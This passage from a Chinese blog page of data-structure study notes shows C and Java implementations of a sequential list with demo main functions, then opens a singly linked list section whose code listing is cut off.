SeqListInsert(*pListC, (*pListC)-&gt;iCount, pListB-&gt;pElem[i]);  <span class="comment">//将LB[i]插入到新表LC的末尾</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">//测试代码，或者主程序代码，在测试InitList函数时，由你自己随意编写；在提交老板后，由项目经理或高级程序员负责编写</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret, i;</span><br><span class="line">    SeqList List1, List2;              <span class="comment">//内存中为List1这个结构体变量分配4+4+4=12个字节</span></span><br><span class="line">    Elemtype myValue;</span><br><span class="line">    Elemtype *pmyValue= &amp;myValue;</span><br><span class="line">    SeqList *pList1= &amp;List1;    <span class="comment">//内存中为pList1这个结构体指针变量分配4个字节         </span></span><br><span class="line">    SeqList *pList3= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//创建演示</span></span><br><span class="line">    ret= InitList( &amp;List1 );  <span class="comment">//注意，InitList需要的是一个结构体变量的地址，故传&amp;pList1</span></span><br><span class="line">    <span class="keyword">if</span> (ret==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建空的顺序表成功！表的理论总长为%d,每次如果不够，自动增长值为%d"</span>, LIST_INIT_SIZE, LISTINCREMENT);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"未能成功分配顺序表的数据存储空间，创建顺序表失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret= InitList( &amp;List2 );  <span class="comment">//注意，InitList需要的是一个结构体变量的地址，故传&amp;pList2</span></span><br><span class="line">    <span class="keyword">if</span> (ret==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建空的顺序表成功！表的理论总长为%d,每次如果不够，自动增长值为%d"</span>, LIST_INIT_SIZE, LISTINCREMENT);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"未能成功分配顺序表的数据存储空间，创建顺序表失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i= <span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        SeqListInsert(pList1, i, (Elemtype)(<span class="string">'H'</span>-i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i= <span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        SeqListInsert(&amp;List2, i, (Elemtype)(<span class="string">'A'</span>+i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//访问演示</span></span><br><span class="line">    ret= GetValue(&amp;List1, <span class="number">2</span>, pmyValue);  <span class="comment">//注意在Debug状态下看看*pmyValue的变化，理解数据传递的方向（从子函数给主调函数）</span></span><br><span class="line">    <span class="keyword">if</span> (ret==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"你要读取表中第%d个元素，其值是%c"</span>, <span class="number">2</span>, *pmyValue); <span class="comment">//主调函数使用子函数传出来的数据</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"你要读取表中第%d个元素，本表不存在这个元素！"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//无序表的合并</span></span><br><span class="line">    DisorderSeqListMerge(&amp;List1, &amp;List2, <span class="number">1</span>, &amp;pList3);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>java版本：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> ID;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">person</span><span class="params">(<span class="keyword">int</span> ID,String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ID = ID;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Seqlist</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXSIZE = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">static</span> person []Element;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> Count;<span class="comment">//线性表当前长度 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造函数，线性表的初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Seqlist</span><span class="params">(<span class="keyword">int</span> maxsize)</span> </span>&#123;</span><br><span class="line">        Count = <span class="number">0</span>;</span><br><span class="line">        Element = <span class="keyword">new</span> person[maxsize];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//取元素值</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> person <span class="title">Getvalue</span><span class="params">(<span class="keyword">int</span> pos)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(Count == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"为空表，查找失败"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pos &lt;= <span class="number">0</span> || pos &gt; Count)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"第"</span>+pos+<span class="string">"个元素不存在"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> Element[pos - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//插入元素</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Insert</span><span class="params">(<span class="keyword">int</span> pos,person value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(Count == MAXSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"表溢出!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pos &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"插入位置错误"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = Count-<span class="number">1</span>;i &gt;= pos-<span class="number">1</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            Element[i+<span class="number">1</span>] = Element[i];</span><br><span class="line">        &#125;</span><br><span class="line">        Element[pos-<span class="number">1</span>] = value;</span><br><span class="line">        Count++;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//删除元素</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Del</span><span class="params">(<span class="keyword">int</span> pos)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pos &lt;= <span class="number">0</span> || pos &gt; Count)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"该元素不存在"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = pos;i &lt;= Count;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Element[i-<span class="number">1</span>] = Element[i];</span><br><span class="line">        &#125;</span><br><span class="line">        Count--;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取长度</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Count;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//清空表</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ListClear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//获得前驱</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> person <span class="title">GetPre</span><span class="params">(<span class="keyword">int</span> pos)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pos &lt; <span class="number">2</span> || pos &gt; Count)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"前驱不存在"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Element[pos - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//获得后驱</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> person <span class="title">GetNext</span><span class="params">(<span class="keyword">int</span> pos)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pos &lt; <span class="number">1</span> || pos &gt; Count - <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"后驱不存在"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Element[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//显示链表</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"当前表中一共有"</span>+Count+<span class="string">"个元素，表中元素如下："</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; Count;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">"ID："</span>+Element[i].ID+<span class="string">"  name："</span>+Element[i].name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="comment">//创建并初始化线性表</span></span><br><span class="line">        Seqlist list1 = <span class="keyword">new</span> Seqlist(<span class="number">10</span>);</span><br><span class="line">        </span><br><span class="line">        person[] data1 = <span class="keyword">new</span> person[<span class="number">5</span>];</span><br><span class="line">        </span><br><span class="line">        person p1 = <span class="keyword">new</span> person(<span class="number">1</span>,<span class="string">"张三"</span>);</span><br><span class="line">        person p2 = <span class="keyword">new</span> person(<span class="number">2</span>,<span class="string">"李四"</span>);</span><br><span class="line">        person p3 = <span class="keyword">new</span> person(<span class="number">3</span>,<span class="string">"王五"</span>);</span><br><span class="line">        person p4 = <span class="keyword">new</span> person(<span class="number">4</span>,<span class="string">"李雷"</span>);</span><br><span class="line">        person p5 = <span class="keyword">new</span> person(<span class="number">5</span>,<span class="string">"韩梅梅"</span>);</span><br><span class="line">        </span><br><span class="line">        data1[<span class="number">0</span>] = p1;</span><br><span class="line">        data1[<span class="number">1</span>] = p2;</span><br><span class="line">        data1[<span class="number">2</span>] = p3;</span><br><span class="line">        data1[<span class="number">3</span>] = p4;</span><br><span class="line">        data1[<span class="number">4</span>] = p5;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                list1.Insert(list1.ListLength()+<span class="number">1</span>,data1[i]);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list1.display();</span><br><span class="line">        System.out.println(<span class="string">"顺序表初始化成功"</span>);</span><br><span class="line">        System.out.println(<span class="string">"表的长度为："</span>+list1.ListLength());</span><br><span class="line">        System.out.println(<span class="string">"表中第三个元素的值："</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"ID："</span>+Getvalue(<span class="number">3</span>).ID+<span class="string">"  name："</span>+Getvalue(<span class="number">3</span>).name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"添加姓名为'刘备'的数据到位置二"</span>);</span><br><span class="line">        person p6 = <span class="keyword">new</span> person(<span class="number">6</span>,<span class="string">"刘备"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            list1.Insert(<span class="number">2</span>,p6);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        list1.display();</span><br><span class="line">        System.out.println(<span class="string">"删除位置四的数据"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            list1.Del(<span class="number">4</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        list1.display();</span><br><span class="line">        System.out.println(<span class="string">"位置二的前驱为："</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"ID："</span>+GetPre(<span class="number">2</span>).ID+<span class="string">"  name："</span>+GetPre(<span class="number">2</span>).name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"位置二的后驱为："</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"ID："</span>+GetNext(<span class="number">2</span>).ID+<span class="string">"  name："</span>+GetNext(<span class="number">2</span>).name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        list1.ListClear();</span><br><span class="line">        System.out.println(<span class="string">"清空线性表成功"</span>);</span><br><span class="line">        System.out.println(list1.ListLength());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="41-单链表"><a href="#41-单链表" class="headerlink" title="41 单链表"></a>41 单链表</h2><p><strong>翔哥代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span 